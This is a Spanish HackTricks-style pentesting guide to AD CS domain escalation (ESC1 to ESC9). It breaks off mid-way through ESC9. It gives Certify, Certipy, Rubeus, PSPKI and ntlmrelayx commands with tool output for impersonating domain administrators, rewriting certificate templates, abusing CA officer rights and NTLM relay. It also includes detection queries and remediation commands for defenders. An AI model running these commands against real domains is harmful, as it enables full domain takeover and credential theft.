# Escalada de Dominio en AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Este es un resumen de las secciones de técnicas de escalada de los posts:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Plantillas de Certificado Mal Configuradas - ESC1

### Explicación

### Plantillas de Certificado Mal Configuradas - ESC1 Explicadas

- **Los derechos de inscripción son otorgados a usuarios con pocos privilegios por la Enterprise CA.**
- **No se requiere aprobación del gerente.**
- **No se necesitan firmas de personal autorizado.**
- **Los descriptores de seguridad en las plantillas de certificado son excesivamente permisivos, lo que permite a usuarios con pocos privilegios obtener derechos de inscripción.**
- **Las plantillas de certificado están configuradas para definir EKUs que facilitan la autenticación:**
- Identificadores de Extended Key Usage (EKU) como Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), o sin EKU (SubCA) están incluidos.
- **La posibilidad de que los solicitantes incluyan un subjectAltName en la Certificate Signing Request (CSR) está permitida por la plantilla:**
- Active Directory (AD) prioriza el subjectAltName (SAN) en un certificado para la verificación de identidad si está presente. Esto significa que, al especificar el SAN en una CSR, se puede solicitar un certificado para suplantar a cualquier usuario (p. ej., un administrador de dominio). Si un solicitante puede especificar un SAN está indicado en el objeto de la plantilla de certificado en AD mediante la propiedad `mspki-certificate-name-flag`. Esta propiedad es una máscara de bits, y la presencia de la bandera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite que el solicitante especifique el SAN.

> [!CAUTION]
> La configuración descrita permite a usuarios con pocos privilegios solicitar certificados con cualquier SAN que elijan, lo que posibilita la autenticación como cualquier principal del dominio mediante Kerberos o SChannel.

Esta funcionalidad a veces se habilita para permitir la generación sobre la marcha de certificados HTTPS o de host por productos o servicios de despliegue, o por falta de comprensión.

Se observa que crear un certificado con esta opción genera una advertencia, lo cual no ocurre cuando se duplica una plantilla de certificado existente (como la plantilla `WebServer`, que tiene `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada) y luego se modifica para incluir un OID de autenticación.

### Abuso

Para **encontrar plantillas de certificado vulnerables** puedes ejecutar:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Para **abusar de esta vulnerabilidad para suplantar a un administrador** se podría ejecutar:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Entonces puedes convertir el **certificado generado al formato `.pfx`** y usarlo para **autenticarse usando Rubeus o certipy** nuevamente:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Los binarios de Windows "Certreq.exe" y "Certutil.exe" pueden usarse para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

La enumeración de plantillas de certificados dentro del esquema de configuración del bosque de AD, específicamente aquellas que no requieren aprobación ni firmas, que poseen un EKU Client Authentication o Smart Card Logon, y con la bandera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada, puede realizarse ejecutando la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

El segundo escenario de abuso es una variación del primero:

1. Enrollment rights son concedidos a usuarios con pocos privilegios por la Enterprise CA.
2. El requisito de aprobación del manager está deshabilitado.
3. La necesidad de firmas autorizadas se omite.
4. Un security descriptor demasiado permisivo en la plantilla de certificado concede derechos de enrollment de certificados a usuarios con pocos privilegios.
5. **La plantilla de certificado está definida para incluir el Any Purpose EKU o ningún EKU.**

El **Any Purpose EKU** permite que un atacante obtenga un certificado para **cualquier propósito**, incluyendo client authentication, server authentication, code signing, etc. La misma **technique used for ESC3** puede emplearse para explotar este escenario.

Los certificados con **no EKUs**, que actúan como certificados de CA subordinada, pueden ser explotados para **cualquier propósito** y **también pueden usarse para firmar nuevos certificados**. Por lo tanto, un atacante podría especificar EKUs arbitrarios o campos en los nuevos certificados utilizando un certificado de CA subordinada.

Sin embargo, los nuevos certificados creados para **domain authentication** no funcionarán si la CA subordinada no es confiable por el objeto **`NTAuthCertificates`**, que es la configuración por defecto. No obstante, un atacante aún puede crear **nuevos certificados con cualquier EKU** y valores de certificado arbitrarios. Estos podrían ser potencialmente **abusados** para una amplia gama de propósitos (p. ej., code signing, server authentication, etc.) y podrían tener implicaciones significativas para otras aplicaciones en la red como SAML, AD FS o IPSec.

Para enumerar las plantillas que coinciden con este escenario dentro del esquema de configuración del Forest de AD, se puede ejecutar la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explicación

Este escenario es similar al primero y al segundo pero **abusando** de un **EKU diferente** (Certificate Request Agent) y **2 plantillas distintas** (por lo tanto tiene 2 conjuntos de requisitos),

El **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), conocido como **Enrollment Agent** en la documentación de Microsoft, permite a un principal **solicitar** un **certificado** en **nombre de otro usuario**.

El **“enrollment agent”** se inscribe en dicha **plantilla** y usa el **certificado resultante para co-firmar un CSR en nombre del otro usuario**. Luego **envía** el **CSR co-firmado** a la CA, inscribiéndose en una **plantilla** que **permite “enroll on behalf of”**, y la CA responde con un **certificado perteneciente al “otro” usuario**.

**Requisitos 1:**

- La Enterprise CA concede derechos de enrollment a usuarios de bajo privilegio.
- Se omite el requisito de aprobación del manager.
- No hay requisito de firmas autorizadas.
- El descriptor de seguridad de la plantilla de certificado es excesivamente permisivo, otorgando derechos de enrollment a usuarios de bajo privilegio.
- La plantilla de certificado incluye el Certificate Request Agent EKU, habilitando la solicitud de otras plantillas de certificado en nombre de otros principales.

**Requisitos 2:**

- La Enterprise CA concede derechos de enrollment a usuarios de bajo privilegio.
- Se elude la aprobación del manager.
- La versión del esquema de la plantilla es 1 o superior a 2, y especifica un Application Policy Issuance Requirement que requiere el Certificate Request Agent EKU.
- Un EKU definido en la plantilla de certificado permite la autenticación de dominio.
- No se aplican restricciones para enrollment agents en la CA.

### Abuso

Puedes usar [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) para abusar de este escenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Los **usuarios** a los que se les permite **obtener** un **enrollment agent certificate**, las plantillas en las que los **enrollment agents** están autorizados a inscribirse, y las **cuentas** en nombre de las cuales el enrollment agent puede actuar pueden ser restringidos por las CAs empresariales. Esto se consigue abriendo el complemento `certsrc.msc`, **haciendo clic derecho en la CA**, **haciendo clic en Properties**, y luego **navegando** a la pestaña “Enrollment Agents”.

Sin embargo, se observa que la configuración **por defecto** de las CAs es “**Do not restrict enrollment agents**.” Cuando los administradores habilitan la restricción para los enrollment agents, ajustándola a “Restrict enrollment agents”, la configuración por defecto sigue siendo extremadamente permisiva. Permite que **Everyone** tenga acceso para inscribirse en todas las plantillas como cualquier usuario.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

El **descriptor de seguridad** en las **plantillas de certificados** define los **permisos** que los **principales de AD** específicos poseen con respecto a la plantilla.

Si un **atacante** posee los **permisos** necesarios para **modificar** una **plantilla** e **introducir** cualquiera de las **configuraciones erróneas explotables** descritas en secciones previas, se podría facilitar la escalada de privilegios.

Permisos notables aplicables a las plantillas de certificados incluyen:

- **Owner:** Otorga control implícito sobre el objeto, permitiendo la modificación de cualquier atributo.
- **FullControl:** Permite autoridad completa sobre el objeto, incluyendo la capacidad de modificar cualquier atributo.
- **WriteOwner:** Permite cambiar el owner del objeto a un principal bajo el control del atacante.
- **WriteDacl:** Permite ajustar los controles de acceso, potencialmente otorgando FullControl al atacante.
- **WriteProperty:** Autoriza la edición de cualquier propiedad del objeto.

### Abuse

Para identificar principales con derechos de edición sobre plantillas y otros objetos PKI, enumera con Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Un ejemplo de un privesc como el anterior:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 es cuando un usuario tiene privilegios de escritura sobre una plantilla de certificado. Esto, por ejemplo, puede aprovecharse para sobrescribir la configuración de la plantilla de certificado y hacer que la plantilla sea vulnerable a ESC1.

Como podemos ver en la ruta anterior, solo `JOHNPC` tiene estos privilegios, pero nuestro usuario `JOHN` tiene el nuevo `AddKeyCredentialLink` edge a `JOHNPC`. Dado que esta técnica está relacionada con certificados, también he implementado este ataque, conocido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aquí un pequeño adelanto del comando `shadow auto` de Certipy para recuperar el NT hash de la víctima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** puede sobrescribir la configuración de una plantilla de certificado con un solo comando. Por **default**, Certipy hará **overwrite** la configuración para hacerla **vulnerable to ESC1**. También podemos especificar el **`-save-old` parameter to save the old configuration**, lo cual será útil para **restoring** la configuración después de nuestro attack.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explicación

La extensa red de relaciones interconectadas basadas en ACL, que incluye varios objetos más allá de las plantillas de certificados y la autoridad certificadora, puede afectar la seguridad de todo el sistema AD CS. Estos objetos, que pueden afectar significativamente la seguridad, abarcan:

- El objeto de equipo de AD del servidor CA, que puede ser comprometido mediante mecanismos como S4U2Self o S4U2Proxy.
- El servidor RPC/DCOM de la CA.
- Cualquier objeto o contenedor descendiente de AD dentro de la ruta de contenedor específica `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Esta ruta incluye, pero no se limita a, contenedores y objetos como el Certificate Templates container, Certification Authorities container, el objeto NTAuthCertificates y el Enrollment Services Container.

La seguridad del sistema PKI puede verse comprometida si un atacante con pocos privilegios logra obtener control sobre cualquiera de estos componentes críticos.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicación

El tema tratado en el [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) también aborda las implicaciones del indicador **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, según lo descrito por Microsoft. Esta configuración, cuando está activada en una Certification Authority (CA), permite la inclusión de **valores definidos por el usuario** en el **subject alternative name** para **cualquier request**, incluidas aquellas construidas desde Active Directory®. En consecuencia, esta disposición permite que un **intruso** se inscriba a través de **cualquier template** configurada para la **authentication** de dominio—específicamente aquellas abiertas a la inscripción de usuarios **unprivileged**, como la plantilla estándar User. Como resultado, se puede obtener un certificado que permite al intruso autenticarse como administrador de dominio o como **cualquier otra entidad activa** dentro del dominio.

**Nota**: El enfoque para añadir **alternative names** en una Certificate Signing Request (CSR), a través del argumento `-attrib "SAN:"` en `certreq.exe` (denominados “pares nombre-valor”), contrasta con la estrategia de explotación de los SANs en ESC1. Aquí, la distinción radica en **cómo se encapsula la información de la cuenta**—en un atributo del certificado, en lugar de en una extensión.

### Abuso

Para verificar si la configuración está activada, las organizaciones pueden utilizar el siguiente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Esta operación emplea esencialmente **remote registry access**, por lo tanto, un enfoque alternativo podría ser:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Herramientas como [**Certify**](https://github.com/GhostPack/Certify) y [**Certipy**](https://github.com/ly4k/Certipy) son capaces de detectar esta mala configuración y explotarla:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Para alterar estos ajustes, siempre que se posean derechos de **administrador de dominio** o equivalentes, se puede ejecutar el siguiente comando desde cualquier estación de trabajo:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Para deshabilitar esta configuración en su entorno, la flag puede eliminarse con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Después de las actualizaciones de seguridad de mayo de 2022, los **certificados** recién emitidos contendrán una **extensión de seguridad** que incorpora la propiedad `objectSid` del solicitante. Para ESC1, este SID se deriva del SAN especificado. Sin embargo, para **ESC6**, el SID refleja el `objectSid` del solicitante, no el SAN.\
> Para explotar ESC6, es esencial que el sistema sea susceptible a ESC10 (Weak Certificate Mappings), que prioriza el **SAN sobre la nueva extensión de seguridad**.

## Control de acceso vulnerable de la autoridad de certificación - ESC7

### Ataque 1

#### Explicación

El control de acceso de una autoridad de certificación se mantiene mediante un conjunto de permisos que rigen las acciones de la CA. Estos permisos se pueden ver accediendo a `certsrv.msc`, haciendo clic derecho sobre una CA, seleccionando Propiedades y luego navegando a la pestaña Seguridad. Además, los permisos pueden enumerarse utilizando el módulo PSPKI con comandos como:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Esto ofrece información sobre los permisos principales, a saber **`ManageCA`** y **`ManageCertificates`**, que se corresponden con los roles de “administrador de CA” y “Administrador de certificados”, respectivamente.

#### Abuso

Tener permisos **`ManageCA`** en una autoridad certificadora permite al principal manipular configuraciones de forma remota usando PSPKI. Esto incluye alternar la bandera **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir la especificación de SAN en cualquier plantilla, un aspecto crítico para la escalada de dominio.

La simplificación de este proceso es posible mediante el uso del cmdlet **Enable-PolicyModuleFlag** de PSPKI, que permite realizar modificaciones sin interacción directa con la GUI.

La posesión de **`ManageCertificates`** facilita la aprobación de solicitudes pendientes, eludiendo efectivamente la salvaguarda de “aprobación del administrador de certificados de la CA”.

Se puede utilizar una combinación de los módulos **Certify** y **PSPKI** para solicitar, aprobar y descargar un certificado:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicación

> [!WARNING]
> En el **ataque anterior** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.

Por lo tanto, aquí se presenta otro ataque.

Requisitos previos:

- Solo el permiso **`ManageCA`**
- Permiso **`Manage Certificates`** (puede ser otorgado desde **`ManageCA`**)
- La plantilla de certificado **`SubCA`** debe estar **enabled** (puede habilitarse desde **`ManageCA`**)

La técnica se basa en el hecho de que los usuarios con los derechos de acceso `Manage CA` _and_ `Manage Certificates` pueden **issue failed certificate requests**. La plantilla de certificado **`SubCA`** es **vulnerable to ESC1**, pero **only administrators** pueden inscribirse en la plantilla. Así, un **user** puede **request** inscribirse en la **`SubCA`** — lo cual será **denied** — pero luego **issued by the manager afterwards**.

#### Abuso

Puedes **grant yourself the `Manage Certificates`** access right añadiendo tu usuario como un nuevo oficial.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
La plantilla **`SubCA`** puede **habilitarse en la CA** con el parámetro `-enable-template`. Por defecto, la plantilla `SubCA` está habilitada.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si hemos cumplido los requisitos previos para este ataque, podemos empezar por **solicitar un certificado basado en la plantilla `SubCA`**.

**Esta solicitud será denegada**, pero guardaremos la clave privada y anotaremos el ID de la solicitud.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con nuestros **`Manage CA` and `Manage Certificates`**, podemos entonces **emitir la solicitud de certificado fallida** con el comando `ca` y el parámetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Y finalmente, podemos **recuperar el certificado emitido** con el comando `req` y el parámetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Ataque 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explicación

Además de los abusos clásicos de ESC7 (habilitar atributos EDITF o aprobar solicitudes pendientes), **Certify 2.0** reveló un primitivo completamente nuevo que solo requiere el rol *Manage Certificates* (también conocido como **Certificate Manager / Officer**) en la Enterprise CA.

El método RPC `ICertAdmin::SetExtension` puede ser ejecutado por cualquier principal que tenga *Manage Certificates*. Mientras que el método se usaba tradicionalmente por CAs legítimas para actualizar extensiones en solicitudes **pendientes**, un atacante puede abusar de él para **apendizar una extensión de certificado *no por defecto*** (por ejemplo un OID personalizado de *Certificate Issuance Policy* como `1.1.1.1`) a una solicitud que está esperando aprobación.

Como la plantilla objetivo **no define un valor por defecto para esa extensión**, la CA NO sobrescribirá el valor controlado por el atacante cuando la solicitud sea finalmente emitida. El certificado resultante por lo tanto contiene una extensión elegida por el atacante que puede:

* Satisfacer requisitos de Application / Issuance Policy de otras plantillas vulnerables (conduciendo a escalada de privilegios).
* Inyectar EKUs adicionales o políticas que otorguen al certificado confianza inesperada en sistemas de terceros.

En resumen, *Manage Certificates* – previamente considerado la “mitad menos poderosa” de ESC7 – ahora puede aprovecharse para la escalada de privilegios completa o persistencia a largo plazo, sin tocar la configuración de la CA ni requerir el derecho más restrictivo *Manage CA*.

#### Abusar del primitivo con Certify 2.0

1. **Enviar una solicitud de certificado que permanezca *pendiente*.** Esto puede forzarse con una plantilla que requiera aprobación de un manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Apendizar una extensión personalizada a la solicitud pendiente** usando el nuevo comando `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Si la plantilla no define ya la extensión *Certificate Issuance Policies*, el valor anterior se conservará después de la emisión.*

3. **Emitir la solicitud** (si tu rol también tiene derechos de aprobación *Manage Certificates*) o esperar a que un operador la apruebe. Una vez emitida, descarga el certificado:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. El certificado resultante ahora contiene el OID malicioso de issuance-policy y puede ser usado en ataques posteriores (p. ej. ESC13, escalada de dominio, etc.).

> NOTA:  El mismo ataque puede ejecutarse con Certipy ≥ 4.7 a través del comando `ca` y el parámetro `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explicación

> [!TIP]
> En entornos donde **AD CS está instalado**, si existe un **endpoint de inscripción web vulnerable** y al menos una **certificate template publicada** que permita **domain computer enrollment y client authentication** (como la plantilla por defecto **`Machine`**), ¡se vuelve posible que **cualquier equipo con el servicio spooler activo sea comprometido por un atacante**!

AD CS soporta varios **métodos de inscripción basados en HTTP**, disponibles mediante roles adicionales del servidor que los administradores pueden instalar. Estas interfaces para inscripción basada en HTTP son susceptibles a **NTLM relay attacks**. Un atacante, desde una **máquina comprometida**, puede suplantar cualquier cuenta AD que autentique vía NTLM entrante. Mientras suplantan la cuenta víctima, estas interfaces web pueden ser accedidas por un atacante para **solicitar un certificado de client authentication usando las plantillas `User` o `Machine`**.

- La **web enrollment interface** (una aplicación ASP más antigua disponible en `http://<caserver>/certsrv/`), por defecto usa solo HTTP, lo que no ofrece protección contra NTLM relay attacks. Además, explícitamente permite solo autenticación NTLM a través de su encabezado Authorization HTTP, haciendo inaplicables métodos de autenticación más seguros como Kerberos.
- El **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, y **Network Device Enrollment Service** (NDES) por defecto soportan negotiate authentication vía su encabezado Authorization HTTP. Negotiate authentication **soporta tanto** Kerberos como **NTLM**, permitiendo a un atacante **degradar a NTLM** la autenticación durante ataques de relay. Aunque estos servicios web habilitan HTTPS por defecto, HTTPS por sí sola **no protege contra NTLM relay attacks**. La protección contra NTLM relay para servicios HTTPS solo es posible cuando HTTPS se combina con channel binding. Lamentablemente, AD CS no activa Extended Protection for Authentication en IIS, que es lo requerido para channel binding.

Un problema común con los NTLM relay attacks es la **breve duración de las sesiones NTLM** y la incapacidad del atacante para interactuar con servicios que **requieren NTLM signing**.

Sin embargo, esta limitación se supera explotando un NTLM relay attack para adquirir un certificado para el usuario, ya que el periodo de validez del certificado dicta la duración de la sesión, y el certificado puede ser empleado con servicios que **exigen NTLM signing**. Para instrucciones sobre cómo utilizar un certificado robado, consulte:


{{#ref}}
account-persistence.md
{{#endref}}

Otra limitación de los NTLM relay attacks es que **una máquina controlada por el atacante debe ser autenticada por una cuenta víctima**. El atacante puede esperar o intentar **forzar** esta autenticación:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

El comando `cas` de [**Certify**](https://github.com/GhostPack/Certify) enumera los endpoints HTTP de AD CS habilitados:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propiedad `msPKI-Enrollment-Servers` es utilizada por las Autoridades de Certificación (CAs) empresariales para almacenar los endpoints del Certificate Enrollment Service (CES). Estos endpoints se pueden analizar y listar utilizando la herramienta **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

La solicitud de un certificado la realiza Certipy por defecto basándose en la plantilla `Machine` o `User`, determinada por si el nombre de la cuenta que se está reenviando termina en `$`. La especificación de una plantilla alternativa puede lograrse mediante el uso del parámetro `-template`.

Se puede entonces emplear una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para forzar la autenticación. Cuando se trabaja con controladores de dominio, es necesario especificar `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Sin extensión de seguridad - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicación

El nuevo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) para **`msPKI-Enrollment-Flag`**, referido como ESC9, impide la inclusión de la **nueva extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`** en un certificado. Esta bandera se vuelve relevante cuando `StrongCertificateBindingEnforcement` está establecida en `1` (la configuración por defecto), en contraste con un ajuste de `2`. Su relevancia aumenta en escenarios donde se pueda explotar un mapeo de certificado más débil para Kerberos o Schannel (como en ESC10), dado que la ausencia de ESC9 no modificaría los requisitos.

Las condiciones bajo las cuales la configuración de esta bandera se vuelve significativa incluyen:

- `StrongCertificateBindingEnforcement` no está ajustado a `2` (siendo el valor por defecto `1`), o `CertificateMappingMethods` incluye la bandera `UPN`.
- El certificado está marcado con la bandera `CT_FLAG_NO_SECURITY_EXTENSION` dentro de la configuración `msPKI-Enrollment-Flag`.
- Cualquier EKU de autenticación de cliente está especificado por el certificado.
- Existen permisos `GenericWrite` sobre alguna cuenta para comprometer a otra.

### Escenario de abuso

Supongamos que `John@corp.local` tiene permisos `GenericWrite` sobre `Jane@corp.local`, con el objetivo de comprometer `Administrator@corp.local`. La plantilla de certificado `ESC9`, en la que `Jane@corp.local` tiene permitido inscribirse, está configurada con la bandera `CT_FLAG_NO_SECURITY_EXTENSION` en su ajuste `msPKI-Enrollment-Flag`.

Inicialmente, se adquiere el hash de `Jane` usando Shadow Credentials, gracias al `GenericWrite` de `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo deliberadamente la parte de dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Esta modificación no viola las restricciones, dado que `Administrator@corp.local` sigue siendo distinto como el `userPrincipalName` de `Administrator`.

A continuación, la plantilla de certificado `ESC9`, marcada como vulnerable, se solicita como `Jane`:
```bash
